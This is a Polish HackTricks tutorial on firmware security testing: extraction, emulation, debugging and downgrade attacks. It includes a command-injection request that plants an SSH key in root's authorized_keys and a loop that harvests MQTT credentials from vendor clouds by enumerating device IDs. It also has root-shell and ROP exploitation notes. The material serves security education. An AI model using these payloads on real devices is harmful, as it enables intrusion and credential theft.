# Analiza firmware

{{#include ../../banners/hacktricks-training.md}}

## **Wprowadzenie**

### Powiązane zasoby


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to podstawowe oprogramowanie, które umożliwia poprawne działanie urządzeń, zarządzając i ułatwiając komunikację między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy wchodzą w interakcję. Jest przechowywane w pamięci trwałej, dzięki czemu urządzenie ma dostęp do kluczowych instrukcji od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Badanie i ewentualna modyfikacja firmware są istotnym krokiem w identyfikowaniu luk bezpieczeństwa.

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy początkowy krok w zrozumieniu budowy urządzenia i technologii, których używa. Proces ten obejmuje gromadzenie danych o:

- architekturze CPU i systemie operacyjnym, na którym działa
- szczegółach bootloadera
- układzie sprzętowym i kartach katalogowych (datasheets)
- metrykach kodu i lokalizacjach źródeł
- bibliotekach zewnętrznych i rodzajach licencji
- historiach aktualizacji i certyfikacjach regulacyjnych
- diagramach architektury i przepływów
- ocenach bezpieczeństwa i zidentyfikowanych podatnościach

Do tego celu nieocenione są narzędzia open-source intelligence (OSINT), podobnie jak analiza dostępnych komponentów open-source zarówno ręczna, jak i automatyczna. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware**

Pozyskanie firmware można przeprowadzić na różne sposoby, z różnym stopniem trudności:

- **Bezpośrednio** od źródła (developerzy, producenci)
- **Budując** go na podstawie dostarczonych instrukcji
- **Pobierając** ze stron pomocy technicznej
- Wykorzystując zapytania **Google dork** do znajdowania hostowanych plików firmware
- Dostęp do **cloud storage** bezpośrednio, przy użyciu narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytywanie **updates** poprzez techniki man-in-the-middle
- **Extracting** z urządzenia przez połączenia takie jak **UART**, **JTAG**, lub **PICit**
- **Sniffing** żądań aktualizacji w komunikacji urządzenia
- Identyfikowanie i używanie **hardcoded update endpoints**
- **Dumping** z bootloadera lub sieci
- **Removing and reading** układu pamięci, gdy wszystkie inne metody zawiodą, używając odpowiednich narzędzi sprzętowych

### UART-only logs: force a root shell via U-Boot env in flash

Jeśli UART RX jest ignorowany (są tylko logi), nadal możesz wymusić init shell poprzez **edycję bloba środowiska U-Boot** offline:

1. Zrzutuj SPI flash za pomocą klipsa SOIC-8 + programatora (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Zlokalizuj partycję env U-Boot, edytuj `bootargs`, aby dodać `init=/bin/sh`, i **przekalkuluj CRC32 środowiska U-Boot** dla tego bloba.
3. Reflashuj tylko partycję env i zrestartuj; powinna pojawić się powłoka na UART.

Jest to przydatne w urządzeniach embedded, gdzie shell bootloadera jest wyłączony, ale partycja env jest zapisywalna przy dostępie z zewnętrznej pamięci flash.

## Analiza firmware

Teraz, gdy **masz firmware**, musisz wydobyć z niego informacje, aby wiedzieć, jak je dalej traktować. Różne narzędzia, których możesz do tego użyć:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Jeśli nie znajdziesz dużo za pomocą tych narzędzi, sprawdź **entropię** obrazu poleceniem `binwalk -E <bin>` — jeśli entropia jest niska, prawdopodobnie nie jest zaszyfrowany. Jeśli wysoka, prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Dodatkowo możesz użyć tych narzędzi, aby wyodrębnić **pliki osadzone w firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Lub [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) do inspekcji pliku.

### Uzyskiwanie systemu plików

Dzięki wcześniej wspomnianym narzędziom, takim jak `binwalk -ev <bin>`, powinieneś móc **wyodrębnić system plików**.\
Binwalk zwykle wyodrębnia go do **folderu nazwanego typem systemu plików**, który zwykle jest jednym z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie znajdzie magicznego bajtu systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk, aby **znaleźć offset systemu plików i wykroić (carve) skompresowany system plików** z obrazu binarnego oraz **ręcznie wyodrębnić** system plików zgodnie z jego typem, stosując poniższe kroki.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Uruchom poniższe **dd command**, aby wyodrębnić system plików Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatywnie można również uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się potem w katalogu "`squashfs-root`".

- Pliki archiwum CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs na NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza oprogramowania układowego

Po uzyskaniu firmware'u konieczne jest jego rozebranie, aby zrozumieć strukturę i potencjalne podatności. Proces ten polega na wykorzystaniu różnych narzędzi do analizy i wyodrębniania przydatnych danych z obrazu firmware.

### Narzędzia do analizy wstępnej

Poniżej znajduje się zestaw poleceń do wstępnej inspekcji pliku binarnego (określanego jako `<bin>`). Polecenia te pomagają w identyfikacji typów plików, wyodrębnianiu ciągów znaków, analizie danych binarnych oraz zrozumieniu partycji i szczegółów systemów plików:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Aby ocenić stan szyfrowania obrazu, sprawdza się **entropię** przy użyciu `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka entropia wskazuje na możliwe szyfrowanie lub kompresję.

Do ekstrakcji **osadzonych plików** zalecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Przy użyciu `binwalk -ev <bin>` zazwyczaj można wyodrębnić system plików, często do katalogu nazwanego według typu systemu plików (np. squashfs, ubifs). Jednak gdy **binwalk** nie rozpoznaje typu systemu plików z powodu brakujących bajtów magicznych, konieczne jest ręczne wyodrębnienie. Polega to na użyciu `binwalk` do znalezienia przesunięcia systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Następnie, w zależności od typu systemu plików (np., squashfs, cpio, jffs2, ubifs), używa się różnych poleceń do ręcznego wypakowania zawartości.

### Analiza systemu plików

Po wypakowaniu systemu plików rozpoczyna się poszukiwanie błędów bezpieczeństwa. Zwraca się uwagę na niezabezpieczone demony sieciowe, twardo zakodowane poświadczenia, punkty końcowe API, funkcjonalności serwera aktualizacji, niekompilowany kod, skrypty startowe oraz skompilowane pliki binarne do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia to:

- **etc/shadow** and **etc/passwd** w poszukiwaniu poświadczeń użytkowników
- Certyfikaty i klucze SSL w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych podatności
- Wbudowane pliki binarne do dalszej analizy
- Typowe serwery WWW urządzeń IoT i pliki binarne

Kilka narzędzi pomaga w odkrywaniu wrażliwych informacji i podatności wewnątrz systemu plików:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w systemie plików muszą być dokładnie sprawdzone pod kątem podatności. Narzędzia takie jak **checksec.sh** dla binarek Unix i **PESecurity** dla binarek Windows pomagają zidentyfikować niezabezpieczone pliki binarne, które mogą zostać wykorzystane.

## Zbieranie konfiguracji chmury i poświadczeń MQTT za pomocą pochodnych tokenów URL

Wiele hubów IoT pobiera konfigurację dla poszczególnych urządzeń z endpointu chmurowego, który wygląda tak:

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware'u możesz odkryć, że `<token>` jest wyprowadzany lokalnie z device ID przy użyciu twardo zakodowanego sekretu, na przykład:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Takie rozwiązanie pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać konfigurację z chmury, często ujawniając jawne poświadczenia MQTT i prefiksy tematów.

Praktyczny przebieg:

1) Wyodrębnij deviceId z logów bootowania UART

- Podłącz adapter UART 3.3V (TX/RX/GND) i przechwyć logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Szukaj linii wypisujących wzorzec URL konfiguracji chmury i adres brokera, na przykład:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Odzyskaj STATIC_KEY i algorytm tokena z firmware

- Wczytaj binaria do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wygeneruj token w Bash i zamień digest na wielkie litery:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Zbieranie cloud config i poświadczeń MQTT

- Skomponuj URL i pobierz JSON za pomocą curl; przeparsuj za pomocą jq, aby wyodrębnić secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Wykorzystaj niezaszyfrowane MQTT i słabe topic ACLs (jeśli występują)

- Użyj odzyskanych poświadczeń, aby zasubskrybować tematy serwisowe i wyszukać wrażliwe zdarzenia:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumeruj przewidywalne identyfikatory urządzeń (na dużą skalę, z autoryzacją)

- Wiele ekosystemów osadza bajty OUI dostawcy/produktu/typu, po których następuje sekwencyjny sufiks.
- Możesz iterować po kandydackich ID, wyprowadzać tokeny i programowo pobierać konfiguracje:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Uwagi
- Zawsze uzyskaj wyraźną autoryzację przed przystąpieniem do mass enumeration.
- W miarę możliwości preferuj emulation lub static analysis, aby odzyskać secrets bez modyfikowania sprzętu docelowego.

Proces emulowania firmware umożliwia **dynamic analysis** zarówno działania urządzenia, jak i pojedynczego programu. Podejście to może napotkać problemy związane z hardware lub architecture dependencies, ale przeniesienie root filesystem lub konkretnych binaries na urządzenie o zgodnej architecture i endianness, takim jak Raspberry Pi, lub na pre-built virtual machine, może ułatwić dalsze testy.

### Emulacja pojedynczych plików binarnych

Do badania pojedynczych programów kluczowe jest zidentyfikowanie endianness programu oraz CPU architecture.

#### Przykład dla architektury MIPS

Aby emulować plik binarny dla architektury MIPS, można użyć polecenia:
```bash
file ./squashfs-root/bin/busybox
```
Aby zainstalować niezbędne narzędzia do emulacji:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Dla MIPS (big-endian) używa się `qemu-mips`, a dla binarek little-endian odpowiednim wyborem jest `qemu-mipsel`.

#### Emulacja architektury ARM

Dla binarek ARM proces jest podobny — do emulacji używany jest `qemu-arm`.

### Pełna emulacja systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), i inne ułatwiają pełną emulację firmware, automatyzując proces i wspomagając analizę dynamiczną.

## Analiza dynamiczna w praktyce

Na tym etapie do analizy używane jest środowisko urządzenia rzeczywistego lub emulowanego. Ważne jest utrzymanie dostępu do shell, OS i filesystem. Emulacja może nie odzwierciedlać w pełni interakcji ze sprzętem, co może wymagać okazjonalnego restartu emulacji. Analiza powinna obejmować ponowne przeglądnięcie filesystem, eksploatację odsłoniętych webpages i usług sieciowych oraz zbadanie podatności bootloadera. Testy integralności firmware są krytyczne do identyfikacji potencjalnych backdoorów.

## Techniki analizy w czasie wykonywania

Analiza w czasie wykonywania polega na interakcji z procesem lub binarką w jej środowisku operacyjnym, używając narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania breakpoints oraz identyfikowania podatności poprzez fuzzing i inne techniki.

Dla embedded targets bez pełnego debuggera, **skopiuj statycznie linkowany `gdbserver`** na urządzenie i podłącz się zdalnie:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Eksploatacja binarna i dowód koncepcji (PoC)

Opracowanie PoC dla zidentyfikowanych podatności wymaga głębokiego zrozumienia architektury celu oraz programowania w językach niskiego poziomu. Ochrony czasu wykonania binarek w systemach embedded są rzadkie, ale gdy występują, techniki takie jak Return Oriented Programming (ROP) mogą być konieczne.

### Notatki o exploitacji fastbin w uClibc (embedded Linux)

- **Fastbins + consolidation:** uClibc używa fastbinów podobnych do glibc. Późniejsze duże przydzielenie może wywołać `__malloc_consolidate()`, więc każdy fałszywy chunk musi przejść kontrole (rozsądny rozmiar, `fd = 0`, i otaczające chunk'i uznane za "in use").
- **Non-PIE binaries under ASLR:** jeśli ASLR jest włączony, ale główny binarny jest **non-PIE**, adresy `.data/.bss` wewnątrz binarki są stabilne. Możesz zaatakować region, który już przypomina prawidłowy nagłówek chunku sterty, aby uzyskać przydział fastbin na **function pointer table**.
- **Parser-stopping NUL:** podczas parsowania JSON, `\x00` w payload może zatrzymać parser, zachowując następujące bajty kontrolowane przez atakującego, które można użyć do stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może zapisać wykonywalny shellcode w znanym mapowaniu i skoczyć do niego.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) dostarczają wstępnie skonfigurowane środowiska do testów bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja mająca pomóc w przeprowadzaniu security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, zapewniając wstępnie skonfigurowane środowisko z wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system oparty na Ubuntu 18.04, wstępnie załadowany z narzędziami do firmware security testing.

## Ataki downgradowania firmware i niebezpieczne mechanizmy aktualizacji

Nawet jeśli producent implementuje sprawdzanie podpisów kryptograficznych dla obrazów firmware, **version rollback (downgrade) protection is frequently omitted**. Gdy boot- lub recovery-loader jedynie weryfikuje podpis za pomocą osadzonego klucza publicznego, ale nie porównuje *version* (lub monotonicznego licznika) obrazu, który ma być wgrany, atakujący może legalnie zainstalować **starszy, podatny firmware, który nadal ma ważny podpis** i w ten sposób ponownie wprowadzić załatane podatności.

Typowy przebieg ataku:

1. **Obtain an older signed image**
* Pobierz go z publicznego portalu pobierania producenta, CDN lub strony wsparcia.
* Wyciągnij go z towarzyszących aplikacji mobilnych/desktopowych (np. wewnątrz Android APK pod `assets/firmware/`).
* Otrzymaj go z repozytoriów stron trzecich, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Wiele konsumenckich urządzeń IoT udostępnia *unauthenticated* endpointy HTTP(S), które akceptują Base64-encoded firmware blobs, dekodują je po stronie serwera i wywołują recovery/upgrade.
3. Po downgrade, wykorzystaj podatność, która została załatana w nowszym wydaniu (na przykład filtr command-injection dodany później).
4. Opcjonalnie wgraj najnowszy obraz z powrotem albo wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu persistence.

### Przykład: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
W podatnym (obniżonym) firmware parametr `md5` jest konkatenowany bezpośrednio do polecenia shell bez sanitizacji, co pozwala na wstrzyknięcie dowolnych poleceń (tutaj – enabling SSH key-based root access). Późniejsze wersje firmware wprowadziły podstawowy filtr znaków, ale brak ochrony przed downgrade sprawia, że poprawka jest bezskuteczna.

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu vendorów pakuje pełne obrazy firmware w swoich companion mobile applications, tak aby aplikacja mogła zaktualizować urządzenie przez Bluetooth/Wi-Fi. Te pakiety są zwykle przechowywane niezaszyfrowane w APK/APEX pod ścieżkami takimi jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, czy nawet zwykły `unzip` pozwalają wyciągnąć signed images bez konieczności dostępu do hardware fizycznego.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checklist for Assessing Update Logic

* Czy transport/uwierzytelnianie *endpointu aktualizacji* jest odpowiednio zabezpieczone (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numer wersji** lub **monotoniczny licznik anty-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach secure boot chain (np. podpisy sprawdzane przez kod ROM)?
* Czy kod userland wykonuje dodatkowe sanity checks (np. dozwolona mapa partycji, numer modelu)?
* Czy *częściowe* lub *zapasowe* procesy aktualizacji ponownie wykorzystują tę samą logikę walidacji?

> 💡  Jeśli którekolwiek z powyższych elementów brakuje, platforma prawdopodobnie jest podatna na ataki rollback.

## Vulnerable firmware to practice

Aby ćwiczyć wykrywanie podatności w firmware, jako punkt wyjścia użyj następujących projektów vulnerable firmware.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
